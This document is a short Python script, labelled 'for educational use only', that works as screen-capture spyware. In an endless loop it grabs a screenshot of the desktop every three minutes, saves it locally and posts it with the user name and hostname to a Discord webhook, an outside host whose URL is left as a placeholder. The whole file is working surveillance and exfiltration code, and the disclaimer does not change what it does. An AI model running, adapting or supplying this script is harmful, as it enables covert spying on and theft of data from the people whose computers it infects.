# FOR EDUCATIONAL USE ONLY

import os
import time
import socket
import getpass
import requests
from PIL import ImageGrab

# Define the time interval in seconds
interval = 180

# Discord webhook URL
webhook_url = "WEBHOOK URL HERE"

# Create a folder inside the temporary directory to save the screenshots
temp_dir = f"C:/screenshots_{getpass.getuser()}"
if not os.path.exists(temp_dir):
    os.makedirs(temp_dir)

# Get the name of the current user and the hostname of the computer
user = getpass.getuser()
hostname = socket.gethostname()

# Run the script indefinitely
while True:
    # Take a screenshot of the entire desktop
    img = ImageGrab.grab()

    # Save the screenshot to a file in the temporary directory
    file_name = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
    img.save(file_name)

    # Send the latest screenshot, the current user name, and the hostname to the Discord webhook
    with open(file_name, "rb") as f:
        r = requests.post(webhook_url, data={"content": f"New screenshot from **{user}** on **{hostname}**:"}, files={"image": f})

    # Wait for the specified time interval
    time.sleep(interval)
